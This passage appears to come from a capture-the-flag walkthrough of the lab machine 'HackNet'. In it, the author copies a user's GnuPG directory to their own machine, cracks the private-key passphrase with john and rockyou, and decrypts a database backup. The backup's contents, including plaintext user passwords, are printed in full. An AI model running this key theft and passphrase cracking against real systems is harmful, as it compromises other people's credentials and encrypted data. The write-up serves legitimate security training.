      21395E17872E64F474BF80F1D72E5C1FA19C12F7
uid           [ultimate] Sandy (My key for backups) <sandy@hacknet.htb>
ssb   rsa1024 2024-12-29 [E]

sandy@hacknet:~/.gnupg$ 

```

maybe try and decrypt the backups

![hacknet-15](/images/hacknet/Pasted image 20250926222303.png)

```shell
gpg --decrypt backup01.sql.gpg
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
gpg: public key decryption failed: Timeout
gpg: decryption failed: No secret key
sandy@hacknet:/var/www/HackNet/backups$ 

```

maybe there is someway to obtain the secret from the .gnupg directory

I will archive this directory and transfer to my machine

```shell
tar czf gnupg.tar.gz .gnupg
sandy@hacknet:~$ ls
gnupg.tar.gz
sandy@hacknet:~$ python3 -m http.server 8090

```

Download on my machine, then extract

```shell
wget http://hacknet.htb:8090/gnupg.tar.gz
tar -xzf gnupg.tar.gz 

ls -la    
total 20
drwxrwxr-x 3 husmal husmal 4096 Sep 26 22:32 .
drwxrwxr-x 4 husmal husmal 4096 Sep 26 22:27 ..
drwx------ 4 husmal husmal 4096 Sep 26 22:26 .gnupg
-rw-rw-r-- 1 husmal husmal 6070 Sep 26 22:30 gnupg.tar.gz

```


To unlock the OpenPGP secret key we can use `gpg2john` and then crack the passphrase

```shell
gpg2john private-keys-v1.d/armored_key.asc > hash.txt                  
Created directory: /home/husmal/.john

File private-keys-v1.d/armored_key.asc

```

Now to crack the hash:

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt --format=gpg hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetheart       (Sandy)     
1g 0:00:00:01 DONE (2025-09-26 22:39) 0.6289g/s 271.6p/s 271.6c/s 271.6C/s 246810..nicole1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

let's see what is hidden inside these backups

#### Backup 1

```shell
 gpg --decrypt backup01.sql.gpg
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
-- MariaDB dump 10.19  Distrib 10.11.6-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: hacknet
-- ------------------------------------------------------
-- Server version       10.11.6-MariaDB-0+deb12u1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `SocialNetwork_contactrequest`
--

DROP TABLE IF EXISTS `SocialNetwork_contactrequest`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_contactrequest` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `from_user_id` bigint(20) NOT NULL,
  `to_user_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `SocialNetwork_contac_from_user_id_0bebebca_fk_SocialNet` (`from_user_id`),
  KEY `SocialNetwork_contac_to_user_id_9cf0ef37_fk_SocialNet` (`to_user_id`),
  CONSTRAINT `SocialNetwork_contac_from_user_id_0bebebca_fk_SocialNet` FOREIGN KEY (`from_user_id`) REFERENCES `SocialNetwork_socialuser` (`id`),
  CONSTRAINT `SocialNetwork_contac_to_user_id_9cf0ef37_fk_SocialNet` FOREIGN KEY (`to_user_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_contactrequest`
--

LOCK TABLES `SocialNetwork_contactrequest` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_contactrequest` DISABLE KEYS */;
/*!40000 ALTER TABLE `SocialNetwork_contactrequest` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialarticle`
--

DROP TABLE IF EXISTS `SocialNetwork_socialarticle`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialarticle` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `text` longtext NOT NULL,
  `date` datetime(6) NOT NULL,
  `likes_number` int(11) NOT NULL,
  `comments_number` int(11) NOT NULL,
  `is_like` tinyint(1) NOT NULL,
  `author_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `SocialNetwork_social_author_id_eaa37621_fk_SocialNet` (`author_id`),
  CONSTRAINT `SocialNetwork_social_author_id_eaa37621_fk_SocialNet` FOREIGN KEY (`author_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=27 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialarticle`
--

LOCK TABLES `SocialNetwork_socialarticle` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialarticle` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialarticle` VALUES
(1,'Just finished an in-depth analysis of a new encryption algorithm. Turns out, it’s more vulnerable than the developers thought. Found a flaw in the key generation process that could lead to predictable keys. Sharing the details in a private forum, but stay tuned for a full write-up on my blog. The importance of secure key management can’t be overstated!','2024-08-08 19:17:22.000000',9,0,0,1),
(2,'Exploring the dark web is like peeling an onion—layers upon layers of hidden services. Discovered a new marketplace that’s operating with military-grade encryption. Impressive setup, but nothing’s invulnerable. I’m working on a proof of concept to bypass their security measures. This will be an interesting challenge.','2024-10-17 12:32:44.000000',8,0,0,1),
(3,'Spent the last few days dissecting a piece of malware disguised as a popular video game mod. The obfuscation techniques were clever, but not clever enough. Managed to reverse-engineer the payload, and it turns out to be a keylogger. Sharing the malware\'s deobfuscated code for educational purposes. Be careful what you download!','2024-11-24 09:08:23.000000',12,0,0,2),
(4,'Just discovered a zero-day in a popular CMS platform. This vulnerability allows remote code execution with minimal effort. Reporting it to the developers now, but this could have serious implications if it gets into the wrong hands. Always vet your plugins and themes—this one slipped through the cracks.','2024-07-15 16:51:59.000000',9,0,0,4),
(5,'Zero-days are rare, but when you find one, it’s like striking gold. Working on a new exploit for a vulnerability I found in a widely used IoT device. This could impact thousands of devices worldwide. Documenting everything carefully—responsible disclosure is key.','2024-11-05 02:31:26.000000',13,2,0,4),
(6,'Cryptography is a double-edged sword. I’ve been working on breaking a new encryption scheme that claims to be uncrackable. Spoiler: it’s not. Found a flaw in the implementation that could allow attackers to decrypt messages without the key. Going to present my findings at the next conference.','2025-01-20 22:12:49.000000',8,1,0,5),
(7,'People are the weakest link in security. I conducted a social engineering experiment to see how easy it was to obtain sensitive information from employees at a local tech firm. Within hours, I had access to their internal network. The human element is always exploitable.','2024-12-03 11:22:28.000000',4,0,0,6),
(8,'Just completed a penetration test on a corporate network. Found several unpatched vulnerabilities that could have been exploited by anyone with basic knowledge. Wrote a detailed report for the client, but I’ll be sharing some of the more interesting findings here soon.','2025-01-23 17:51:14.000000',1,0,0,8),
(9,'Glitches can be more than just bugs—they can be pathways to deeper vulnerabilities. I recently discovered a way to exploit a glitch in a video game to access hidden files on the server. The developers had no idea this was even possible. Documenting the process now.','2024-11-13 13:11:46.000000',6,0,0,9),
(10,'Fault injection attacks are fascinating. I’ve been experimenting with voltage glitching on embedded systems to see what I can break. So far, I’ve managed to bypass authentication on several devices. Writing up a tutorial for anyone interested in this technique.','2025-02-10 20:09:15.000000',9,0,0,9),
(11,'Data breaches are a goldmine for information. I recently got my hands on a dataset from a breached social network and started analyzing the user behavior patterns. The insights are incredible—people are predictable in their online habits. I’ll be sharing some anonymized findings soon.','2024-05-20 14:41:45.000000',12,0,0,10),
(12,'Software protections are getting tougher, but they’re not invincible. I’ve been working on cracking a new DRM system that’s being used in the latest video games. It’s been a challenge, but I’m making progress. Expect a detailed breakdown in the coming weeks.','2024-09-18 04:10:13.000000',1,0,0,12),
(13,'Network security is all about layers. I’ve been testing a multi-layered defense strategy on a corporate network, and so far, it’s holding up well against simulated attacks. Writing up my findings to share with the community—defense in depth is key.','2024-08-01 12:33:47.000000',7,0,0,13),
(14,'Intrusion detection systems are only as good as the rules they’re based on. I’ve been tweaking some custom IDS rules to catch more sophisticated attacks. Managed to detect a few previously unknown attack vectors. Sharing the rule set for anyone interested.','2024-12-23 15:24:08.000000',7,0,0,13),
(15,'Captured some interesting packets from a poorly secured Wi-Fi network. Found a treasure trove of unencrypted data, including login credentials and private messages. It’s a reminder that encryption should be the default for all network communications.','2024-12-08 17:14:54.000000',19,3,0,14),
(16,'Cloaking techniques are evolving. I’ve been working on a new method to hide malicious traffic from intrusion detection systems. Early tests are promising—this could be a game-changer for stealth operations. More to come as I refine the technique.','2024-09-07 09:01:20.000000',10,0,0,16),
(17,'Just finished writing a new Trojan that’s disguised as a legitimate software update. It’s designed to bypass antivirus detection and establish a persistent backdoor. Of course, it’s for research purposes only. Documenting the code and will share it with those interested.','2024-11-12 14:55:51.000000',1,0,0,17),
(18,'Trojan horses are still one of the most effective methods for compromising systems. I’ve been studying some of the latest variants and identifying common traits. Writing up a guide on how to create more effective Trojans—stay tuned.','2024-09-01 10:42:16.000000',1,0,0,17),
(19,'Found an old backdoor in a legacy system that the developers thought they had patched out years ago. Managed to exploit it and gain access to the entire network. It’s a reminder that old vulnerabilities never really go away—they just lie dormant, waiting to be rediscovered.','2024-11-14 18:11:43.000000',0,0,0,18),
(20,'Backdoors are an art form. I’ve been working on a new technique to implant a backdoor in a system without leaving any obvious traces. It’s still in the testing phase, but it’s looking promising. Going to refine it and share the details soon.','2024-12-24 22:31:15.000000',0,0,0,18),
(21,'Crafting exploits is a mix of creativity and technical skill. I’ve been working on a new exploit for a vulnerability in a popular web application. It’s taking longer than expected, but the results will be worth it. Writing up the details as I go.','2024-09-14 12:59:44.000000',12,1,0,19),
(22,'Ethical hacking is about making the digital world a safer place. Just completed a penetration test for a nonprofit organization and identified several critical vulnerabilities. Working with their IT team to get everything patched up—always happy to help make a difference.','2025-01-27 16:18:13.000000',14,2,0,21),
(23,'Exploring the deep web is like diving into the unknown. Recently found a hidden forum that’s full of sensitive data leaks. Started analyzing the information—there’s some valuable intel in there. Going to dig deeper and see what else I can uncover.','2025-01-06 10:45:45.000000',1,0,0,22),
(24,'Just finished developing a new virus that’s designed to spread rapidly across networks. It’s a hybrid of several different strains, combining the best features of each. Of course, it’s for research purposes only—time to see how it performs in the wild.','2024-06-02 14:29:11.000000',8,0,0,23),
(25,'Studying the evolution of viruses is fascinating. I’ve been tracking the development of a new strain that’s been causing havoc recently. It’s incredibly sophisticated, but I’ve identified a few weaknesses. Writing up a report on how to defend against it.','2024-11-02 17:49:34.000000',9,0,0,23),
(26,'Brute force attacks may be noisy, but they’re still effective. I’ve been refining my techniques to make them more efficient, reducing the time it takes to crack even the most complex passwords. Writing up a guide on how to optimize your brute force attacks.','2024-08-30 14:19:57.000000',6,2,0,24);
/*!40000 ALTER TABLE `SocialNetwork_socialarticle` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialarticle_likes`
--

DROP TABLE IF EXISTS `SocialNetwork_socialarticle_likes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialarticle_likes` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `socialarticle_id` bigint(20) NOT NULL,
  `socialuser_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `SocialNetwork_socialarti_socialarticle_id_socialu_44364a80_uniq` (`socialarticle_id`,`socialuser_id`),
  KEY `SocialNetwork_social_socialuser_id_f84a535a_fk_SocialNet` (`socialuser_id`),
  CONSTRAINT `SocialNetwork_social_socialarticle_id_0ac522cf_fk_SocialNet` FOREIGN KEY (`socialarticle_id`) REFERENCES `SocialNetwork_socialarticle` (`id`),
  CONSTRAINT `SocialNetwork_social_socialuser_id_f84a535a_fk_SocialNet` FOREIGN KEY (`socialuser_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=190 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialarticle_likes`
--

LOCK TABLES `SocialNetwork_socialarticle_likes` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialarticle_likes` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialarticle_likes` VALUES
(164,1,4),
(142,1,7),
(121,1,10),
(107,1,12),
(97,1,13),
(83,1,15),
(67,1,17),
(57,1,19),
(19,1,24),
(182,2,2),
(171,2,3),
(163,2,4),
(141,2,7),
(88,2,14),
(50,2,20),
(42,2,21),
(28,2,23),
(184,3,1),
(178,3,2),
(161,3,4),
(147,3,6),
(132,3,8),
(117,3,10),
(87,3,14),
(72,3,16),
(48,3,20),
(39,3,21),
(25,3,23),
(15,3,24),
(173,4,3),
(151,4,6),
(115,4,11),
(108,4,12),
(77,4,16),
(68,4,17),
(31,4,23),
(20,4,24),
(9,4,25),
(185,5,1),
(180,5,2),
(170,5,3),
(140,5,7),
(133,5,8),
(118,5,10),
(112,5,11),
(81,5,15),
(73,5,16),
(64,5,17),
(54,5,19),
(16,5,24),
(5,5,25),
(176,6,2),
(154,6,5),
(145,6,6),
(124,6,9),
(103,6,12),
(85,6,14),
(46,6,20),
(2,6,25),
(155,7,5),
(94,7,13),
(61,7,17),
(4,7,25),
(130,8,8),
(162,9,4),
(104,9,12),
(62,9,17),
(49,9,20),
(40,9,21),
(26,9,23),
(175,10,2),
(144,10,6),
(137,10,7),
(122,10,9),
(100,10,12),
(70,10,16),
(36,10,21),
(11,10,24),
(1,10,25),
(188,11,1),
(166,11,4),
(158,11,5),
(152,11,6),
(143,11,7),
(128,11,9),
(109,11,12),
(84,11,15),
(78,11,16),
(69,11,17),
(45,11,21),
(10,11,25),
(105,12,12),
(157,13,5),
(135,13,8),
(127,13,9),
(98,13,13),
(90,13,14),
(44,13,21),
(8,13,25),
(177,14,2),
(169,14,3),
(92,14,13),
(71,14,16),
(47,14,20),
(23,14,23),
(13,14,24),
(179,15,2),
(168,15,3),
(160,15,4),
(146,15,6),
(138,15,7),
(131,15,8),
(123,15,9),
(111,15,11),
(102,15,12),
(93,15,13),
(86,15,14),
(80,15,15),
(60,15,17),
(53,15,19),
(38,15,21),
(33,15,22),
(24,15,23),
(14,15,24),
(3,15,25),
(181,16,2),
(172,16,3),
(156,16,5),
(134,16,8),
(119,16,10),
(82,16,15),
(75,16,16),
(51,16,20),
(35,16,22),
(7,16,25),
(63,17,17),
(66,18,17),
(187,21,1),
(149,21,6),
(126,21,9),
(113,21,11),
(106,21,12),
(96,21,13),
(74,21,16),
(65,21,17),
(56,21,19),
(29,21,23),
(18,21,24),
(6,21,25),
(183,22,1),
(167,22,3),
(159,22,4),
(153,22,5),
(129,22,8),
(116,22,10),
(110,22,11),
(91,22,13),
(79,22,15),
(59,22,17),
(52,22,19),
(37,22,21),
(22,22,23),
(12,22,24),
(189,23,18),
(174,24,3),
(165,24,4),
(136,24,8),
(120,24,10),
(99,24,13),
(58,24,19),
(32,24,23),
(21,24,24),
(186,25,1),
(148,25,6),
(125,25,9),
(95,25,13),
(55,25,19),
(41,25,21),
(34,25,22),
(27,25,23),
(17,25,24),
(150,26,6),
(114,26,11),
(89,26,14),
(76,26,16),
(43,26,21),
(30,26,23);
/*!40000 ALTER TABLE `SocialNetwork_socialarticle_likes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialcomment`
--

DROP TABLE IF EXISTS `SocialNetwork_socialcomment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialcomment` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `text` longtext NOT NULL,
  `date` datetime(6) NOT NULL,
  `article_id` bigint(20) NOT NULL,
  `author_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `SocialNetwork_social_article_id_09c62d03_fk_SocialNet` (`article_id`),
  KEY `SocialNetwork_social_author_id_4235a6b2_fk_SocialNet` (`author_id`),
  CONSTRAINT `SocialNetwork_social_article_id_09c62d03_fk_SocialNet` FOREIGN KEY (`article_id`) REFERENCES `SocialNetwork_socialarticle` (`id`),
  CONSTRAINT `SocialNetwork_social_author_id_4235a6b2_fk_SocialNet` FOREIGN KEY (`author_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialcomment`
--

LOCK TABLES `SocialNetwork_socialcomment` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialcomment` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialcomment` VALUES
(1,'Great work, whitehat! It\'s awesome to see ethical hacking being used for good, especially for organizations that might not have the resources to maintain top-tier security. Those vulnerabilities could have been devastating if left unchecked. Keep up the great work—you\'re making the internet a safer place for everyone!','2025-01-28 20:45:22.000000',22,5),
(2,'Love seeing hackers use their skills for positive change! Nonprofits often overlook cybersecurity due to budget constraints, so your work here is invaluable. I’d be interested to know what kind of vulnerabilities you found—anything that stood out as particularly surprising?','2025-01-30 12:32:53.000000',22,3),
(3,'Yikes! It\'s scary how many people still use unsecured networks without thinking twice. Capturing unencrypted data is like finding an open vault. This is a good reminder for everyone to always use a VPN when connecting to public Wi-Fi. Encryption should be non-negotiable in today’s world.','2024-12-16 16:29:12.000000',15,19),
(4,'That’s a goldmine of data, but also a stark reminder of how vulnerable people are when they don’t take basic precautions. It’s amazing how many networks are still left wide open. Hopefully, posts like this will encourage more users to secure their communications.','2024-12-31 12:13:56.000000',15,23),
(5,'Unencrypted data on a public network is a hacker’s dream and a user’s nightmare. It\'s shocking how many people still don\'t realize the risks of using insecure Wi-Fi. This should be a wake-up call for anyone who thinks they’re safe without encryption.','2025-01-06 22:31:25.000000',15,8),
(6,'That’s a huge find! It’s incredible how often \'uncrackable\' encryption schemes turn out to have vulnerabilities in their implementation. Can’t wait to hear more about this at the conference—this could have major implications for anyone relying on that scheme for security.','2025-01-21 23:12:45.000000',6,9),
(7,'Finding a zero-day is like hitting the jackpot! It’s great to hear you’re taking the responsible disclosure route—those IoT devices are in so many homes, and an exploit like this could cause massive damage if it fell into the wrong hands. Looking forward to reading your documentation.','2024-11-28 04:58:23.000000',5,14),
(8,'Zero-days in IoT devices are especially concerning given how widespread they are. Your work could be crucial in preventing a potential disaster. Kudos for emphasizing responsible disclosure—can’t wait to see how this unfolds.','2024-12-23 18:34:55.000000',5,2),
(9,'Exploits that take time usually turn out to be the most sophisticated and effective. The mix of creativity and technical skill is what sets great work apart—looking forward to seeing the final result. Your write-up will definitely be a valuable read!','2024-10-27 16:12:58.000000',21,13),
(10,'Brute force may be old-school, but it’s hard to argue with results. Efficiency improvements could make this technique even more formidable—can’t wait to see your guide on optimizing it. It\'s always fascinating to see how these methods evolve.','2024-08-31 15:59:35.000000',26,20),
(11,'Reducing the time to crack complex passwords is no small feat. Even though brute force is noisy, it’s still one of the most reliable methods out there. Your guide will be a must-read for anyone looking to sharpen their skills in this area!','2024-09-02 09:04:13.000000',26,7);
/*!40000 ALTER TABLE `SocialNetwork_socialcomment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialmessage`
--

DROP TABLE IF EXISTS `SocialNetwork_socialmessage`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialmessage` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `date` datetime(6) NOT NULL,
  `text` longtext NOT NULL,
  `is_read` tinyint(1) NOT NULL,
  `from_user_id` bigint(20) NOT NULL,
  `to_user_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `SocialNetwork_social_from_user_id_c7b711b1_fk_SocialNet` (`from_user_id`),
  KEY `SocialNetwork_social_to_user_id_5dc6657d_fk_SocialNet` (`to_user_id`),
  CONSTRAINT `SocialNetwork_social_from_user_id_c7b711b1_fk_SocialNet` FOREIGN KEY (`from_user_id`) REFERENCES `SocialNetwork_socialuser` (`id`),
  CONSTRAINT `SocialNetwork_social_to_user_id_5dc6657d_fk_SocialNet` FOREIGN KEY (`to_user_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=47 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialmessage`
--

LOCK TABLES `SocialNetwork_socialmessage` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialmessage` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialmessage` VALUES
(1,'2024-12-27 17:19:17.907990','Hey! Have you seen the latest episode of Space Chronicles?',1,11,1),
(2,'2024-12-27 17:19:34.532931','No spoilers! I’m planning to watch it tonight. Is it good?',1,1,11),
(3,'2024-12-27 17:19:51.380822','Oh, it’s amazing! Lots of twists. You’re going to love it.',1,11,1),
(4,'2024-12-27 17:20:09.524879','Can’t wait. Should I prepare for any emotional rollercoasters?',1,1,11),
(5,'2024-12-27 17:20:24.703076','Definitely. Keep tissues nearby.',0,11,1),
(6,'2024-12-27 17:21:03.637268','Hey, are you free this weekend?',1,15,5),
(7,'2024-12-27 17:21:17.031076','Not sure yet. What’s up?',1,5,15),
(8,'2024-12-27 17:21:38.885214','I was thinking we could go hiking. Weather looks perfect.',1,15,5),
(9,'2024-12-27 17:21:54.399481','Sounds fun! Let me check my schedule and get back to you.',1,5,15),
(10,'2024-12-27 17:22:08.019864','Cool. Let me know by Friday, so I can plan accordingly.',1,15,5),
(11,'2024-12-27 17:22:37.655136','I need some advice on buying a new laptop. Any recommendations?',1,24,9),
(12,'2024-12-27 17:22:57.853152','Sure! What’s your budget and primary use?',1,9,24),
(13,'2024-12-27 17:23:16.411365','Around $1,000. Mostly for work and light gaming.',1,24,9),
(14,'2024-12-27 17:23:35.110384','Check out the Dell XPS 13 or the ASUS ROG Zephyrus G14. Both are great options.',1,9,24),
(15,'2024-12-27 17:23:51.799717','Thanks! I’ll look into those.',1,24,9),
(16,'2024-12-27 17:24:14.407907','I’m stuck on level 12 of Mystic Quest. Any tips?',1,13,7),
(17,'2024-12-27 17:24:28.926127','Oh, that level’s tricky. Focus on upgrading your shield first.',1,7,13),
(18,'2024-12-27 17:24:42.848217','Got it. What about the boss fight?',1,13,7),
(19,'2024-12-27 17:24:58.353582','Use ranged attacks and dodge a lot. Timing is key.',1,7,13),
(20,'2024-12-27 17:25:12.656028','Thanks! I’ll give it another shot.',1,13,7),
(26,'2024-12-27 17:33:47.519350','Cool. If anything goes wrong, ping me immediately.',1,18,22),
(27,'2024-12-27 17:34:23.653244','Did you hear about the new coffee shop downtown?',1,23,3),
(28,'2024-12-27 17:34:51.679363','Yeah, I went there last week. The caramel latte is amazing.',1,3,23),
(29,'2024-12-27 17:35:06.719977','I’ll have to try it. Is the place cozy?',1,3,23),
(30,'2024-12-27 17:35:24.313146','Very! Great ambiance and fast Wi-Fi. Perfect for working or relaxing.',1,23,3),
(31,'2024-12-27 17:35:41.999268','Awesome. Thanks for the recommendation!',1,3,23),
(32,'2024-12-27 17:37:11.511414','How’s your project coming along?',1,14,6),
(33,'2024-12-27 17:37:26.256242','Slowly but surely. Still working on the presentation slides.',1,6,14),
(34,'2024-12-27 17:37:40.536775','Need any help? I’ve got some free time today.',1,14,6),
(35,'2024-12-27 17:37:58.090203','That would be great! Could you review my draft?',1,6,14),
(36,'2024-12-27 17:38:10.857903','Sure thing. Send it over.',1,14,6),
(37,'2024-12-29 00:43:02.032982','What’s the best way to cook pasta al dente?',1,19,4),
(38,'2024-12-29 00:43:22.235116','Simple! Boil water, add salt, and cook the pasta 1-2 minutes less than the package says.',1,4,19),
(39,'2024-12-29 00:43:41.270862','Do I need to add oil to the water?',1,19,4),
(40,'2024-12-29 00:44:01.955971','No, just stir occasionally to prevent sticking.',1,4,19),
(41,'2024-12-29 00:44:19.343381','Got it. Thanks for the tip!',0,19,4),
(42,'2024-12-29 00:44:55.904749','I’m thinking of adopting a cat. Any advice?',1,6,17),
(43,'2024-12-29 00:45:30.956924','That’s wonderful! Make sure you’re ready for the commitment.',1,17,6),
(44,'2024-12-29 00:45:46.032343','Any specific breeds you’d recommend?',1,6,17),
(45,'2024-12-29 00:46:06.445022','Depends on your lifestyle. Maine Coons are friendly but require grooming.',1,17,6),
(46,'2024-12-29 00:46:23.445332','Good to know. Thanks!',1,6,17);
/*!40000 ALTER TABLE `SocialNetwork_socialmessage` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialuser`
--

DROP TABLE IF EXISTS `SocialNetwork_socialuser`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialuser` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `email` varchar(100) NOT NULL,
  `username` varchar(30) NOT NULL,
  `password` varchar(70) NOT NULL,
  `picture` varchar(100) NOT NULL,
  `about` longtext NOT NULL,
  `contact_requests` int(11) NOT NULL,
  `unread_messages` int(11) NOT NULL,
  `is_public` tinyint(1) NOT NULL,
  `is_hidden` tinyint(1) NOT NULL,
  `two_fa` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `email` (`email`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=26 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialuser`
--

LOCK TABLES `SocialNetwork_socialuser` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialuser` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialuser` VALUES
(1,'cyberghost@darkmail.net','cyberghost','Gh0stH@cker2024','1.jpg','A digital nomad with a knack for uncovering vulnerabilities in the deep web. Passionate about cryptography and secure communications.',0,0,1,0,0),
(2,'hexhunter@ciphermail.com','hexhunter','H3xHunt3r!','2.jpg','A seasoned reverse engineer specializing in binary exploitation. Loves diving into hex editors and uncovering hidden data.',0,0,1,0,0),
(3,'rootbreaker@exploitmail.net','rootbreaker','R00tBr3@ker#','3.jpg','Expert in privilege escalation and bypassing security measures. Always on the lookout for new zero-day vulnerabilities.',0,0,1,0,0),
(4,'zero_day@hushmail.com','zero_day','Zer0D@yH@ck','4.jpg','Focused on discovering zero-day vulnerabilities and creating proof-of-concept exploits. A dark web enthusiast.',0,0,1,0,0),
(5,'cryptoraven@securemail.org','cryptoraven','CrYptoR@ven42','5.jpg','Cryptography expert with a love for breaking and creating secure communication protocols. Always one step ahead in the encryption game.',0,0,1,0,0),
(6,'shadowcaster@darkmail.net','shadowcaster','Sh@d0wC@st!','6.jpg','Specializes in social engineering and OSINT techniques. A master of blending into the digital shadows.',0,0,1,0,0),
(7,'blackhat_wolf@cypherx.com','blackhat_wolf','Bl@ckW0lfH@ck','7.png','A black hat hacker with a passion for ransomware development. Has a reputation for leaving no trace behind.',0,0,1,0,0),
(8,'bytebandit@exploitmail.net','bytebandit','Byt3B@nd!t123','8.png','A skilled penetration tester and ethical hacker. Enjoys dismantling security systems and exposing their weaknesses.',0,0,0,0,0),
(9,'glitch@cypherx.com','glitch','Gl1tchH@ckz','9.png','Specializes in glitching and fault injection attacks. Loves causing unexpected behavior in software and hardware.',0,0,1,0,0),
(10,'datadive@darkmail.net','datadive','D@taD1v3r','10.png','A data miner and analyst with a focus on extracting and analyzing large datasets from breached databases.',0,0,1,0,0),
(11,'phreaker@securemail.org','phreaker','Phre@k3rH@ck','11.png','Old-school hacker with roots in phone phreaking. Now enjoys exploiting telecom systems and VoIP networks.',0,0,0,0,0),
